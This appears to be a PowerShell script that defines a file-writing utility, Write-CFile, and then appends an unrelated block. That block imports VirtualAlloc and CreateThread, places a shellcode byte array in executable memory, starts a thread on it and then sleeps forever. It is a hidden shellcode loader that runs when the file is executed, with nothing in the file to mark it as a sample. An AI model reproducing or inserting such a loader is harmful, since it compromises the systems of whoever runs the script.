
function Write-CFile
{
    
    [CmdletBinding(SupportsShouldProcess=$true)]
    param(
        [Parameter(Mandatory=$true)]
        
        $Path,

        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
        [AllowEmptyCollection()]
        [AllowEmptyString()]
        
        [string[]]$InputObject,

        
        [int]$MaximumTries = 100,

        
        [int]$RetryDelayMilliseconds = 100
    )

    begin
    {
        Set-StrictMode -Version 'Latest'
        Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState

        Write-Timing ('Write-CFile  BEGIN')

        $Path = Resolve-Path -Path $Path
        if( -not $Path )
        {
            return
        }

        $tryNum = 0
        $newLineBytes = [Text.Encoding]::UTF8.GetBytes([Environment]::NewLine)

        [IO.FileStream]$fileWriter = $null

        if( -not $PSCmdlet.ShouldProcess($Path,'write') )
        {
            return
        }

        while( $tryNum++ -lt $MaximumTries )
        {
            $lastTry = $tryNum -eq $MaximumTries

            $numErrorsBefore = $Global:Error.Count
            try
            {
                $fileWriter = New-Object 'IO.FileStream' ($Path,[IO.FileMode]::Create,[IO.FileAccess]::Write,[IO.FileShare]::None,4096,$false)
                break
            }
            catch 
            {
                $numErrorsAfter = $Global:Error.Count
                $numErrors = $numErrorsAfter - $numErrorsBefore
                for( $idx = 0; $idx -lt $numErrors; ++$idx )
                {
                    $Global:Error.RemoveAt(0)
                }

                if( $lastTry )
                {
                    Write-Error -ErrorRecord $_
                }
                else
                {
                    Write-Timing ('Attempt {0,4} to open file "{1}" failed. Sleeping {2} milliseconds.' -f $tryNum,$Path,$RetryDelayMilliseconds)
                    Start-Sleep -Milliseconds $RetryDelayMilliseconds
                }
            }
        }
    }

    process
    {
        Write-Timing ('Write-CFile  PROCESS')
        if( -not $fileWriter )
        {
            return
        }

        foreach( $item in $InputObject )
        {
            [byte[]]$bytes = [Text.Encoding]::UTF8.GetBytes($item)
            $fileWriter.Write($bytes,0,$bytes.Length)
            $fileWriter.Write($newLineBytes,0,$newLineBytes.Length)
        }
    }

    end
    {
        if( $fileWriter )
        {
            $fileWriter.Close()
            $fileWriter.Dispose()
        }
        Write-Timing ('Write-CFile  END')
    }
}

$08Q = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $08Q -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xce,0xb8,0x97,0x02,0xfe,0x68,0xd9,0x74,0x24,0xf4,0x5b,0x31,0xc9,0xb1,0x71,0x31,0x43,0x17,0x83,0xeb,0xfc,0x03,0xd4,0x11,0x1c,0x9d,0x26,0xfd,0x69,0x5e,0xd6,0xfe,0x09,0xd6,0x33,0xcf,0x1b,0x8c,0x30,0x62,0xac,0xc6,0x14,0x8f,0x47,0x8a,0x8c,0x04,0x25,0x03,0xa3,0xad,0x80,0x75,0x8a,0x2e,0x25,0xba,0x40,0xec,0x27,0x46,0x9a,0x21,0x88,0x77,0x55,0x34,0xc9,0xb0,0x8b,0xb7,0x9b,0x69,0xc0,0x6a,0x0c,0x1d,0x94,0xb6,0x2d,0xf1,0x93,0x87,0x55,0x74,0x63,0x73,0xec,0x77,0xb3,0x2c,0x7b,0x3f,0x2b,0x46,0x23,0xe0,0x4a,0x8b,0x37,0xdc,0x05,0xa0,0x8c,0x96,0x94,0x60,0xdd,0x57,0xa7,0x4c,0xb2,0x69,0x08,0x41,0xca,0xae,0xae,0xba,0xb9,0xc4,0xcd,0x47,0xba,0x1e,0xac,0x93,0x4f,0x83,0x16,0x57,0xf7,0x67,0xa7,0xb4,0x6e,0xe3,0xab,0x71,0xe4,0xab,0xaf,0x84,0x29,0xc0,0xcb,0x0d,0xcc,0x07,0x5a,0x55,0xeb,0x83,0x07,0x0d,0x92,0x92,0xed,0xe0,0xab,0xc5,0x49,0x5c,0x0e,0x8d,0x7b,0x89,0x28,0xcc,0x13,0x23,0x50,0x9b,0xe3,0xd3,0xed,0x0a,0x8d,0x4a,0x9b,0x2b,0x05,0xe5,0xd7,0xc4,0x83,0xf2,0x18,0xff,0xfa,0x03,0xb1,0x57,0xab,0xac,0x68,0x30,0x69,0x05,0xec,0x67,0x72,0x7c,0xe5,0x08,0xd7,0x4e,0x33,0x99,0xb6,0xda,0xc0,0x4b,0x69,0x71,0x97,0x38,0xd9,0xed,0x40,0x36,0x46,0x2b,0x91,0x9d,0x93,0xfb,0x37,0x2f,0xb1,0x56,0xa0,0x4f,0x07,0x37,0xb4,0x02,0x35,0xe5,0xe5,0xf0,0xe9,0x61,0xed,0xa0,0x27,0x49,0x0e,0x9f,0xbe,0x6b,0x9a,0x30,0x9b,0x1b,0xdb,0x02,0x1b,0xdc,0x52,0x84,0x71,0xd8,0x34,0x2f,0x9a,0xb6,0xdc,0xda,0xe2,0xa8,0x9b,0xda,0x3f,0xe5,0x5c,0x73,0xe8,0x51,0xf4,0x2a,0x7e,0x73,0xfc,0xca,0x05,0x74,0xd5,0x6e,0x39,0xff,0xf8,0x3b,0xb6,0x84,0x8e,0xbc,0xc8,0x84,0x7b,0x6d,0x21,0x1c,0x7b,0x8e,0xb1,0xf5,0xd0,0x71,0x4e,0xfa,0x06,0xe3,0xdf,0x61,0x2c,0x97,0x7a,0x19,0xe1,0x14,0xf2,0xb4,0x8e,0xf5,0x94,0x32,0x1a,0x6f,0x1a,0xd5,0xb9,0x03,0xf4,0x4c,0x3a,0xb9,0x08,0x64,0xd1,0x70,0xc8,0x25,0x76,0x19,0xca,0xb3,0x74,0x8d,0xa0,0x41,0x13,0x2f,0x63,0x2e,0x39,0xd9,0x51,0xe1,0x42,0xf3,0xf6,0xcf,0x7c,0x9a,0x40,0x2b,0x7e,0x4a,0x74,0x60,0x0d,0xc0,0x50,0x81,0x3c,0x19,0x2c,0x92,0x6e,0xc8,0x1a,0xfd,0x9c,0x7c,0x2b,0x1f,0x5f,0x55,0xae,0x20,0xd4,0x7b,0xe8,0x25,0xd5,0xf0,0x1e,0x4c,0xd6,0xac,0x4e,0x1d,0x92,0x68,0x62,0x4d,0x48,0x19,0x57,0x3a,0xc0,0x82,0x58,0x11,0x9f,0xd9,0xa2,0x71,0x6e,0x72,0xc2,0x43,0xf9,0xf2,0x40,0xb3,0xd3,0x97,0x64,0x1c,0xb4,0x56,0xef,0xcd,0xc3,0x66,0x3a,0x7b,0xcc,0xf0,0x34,0xc9,0x6e,0x56,0x4b,0xe7,0x87,0xc7,0x4c,0xf7,0xa7,0x96,0x9c,0x78,0x36,0x00,0xe0,0x90,0x38,0x30,0x1f,0x9f,0xae,0xbf,0xba,0x0d,0x58,0x2b,0x6a,0xbd,0xf1,0xab;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$QWjc=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($QWjc.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$QWjc,0,0,0);for (;;){Start-sleep 60};

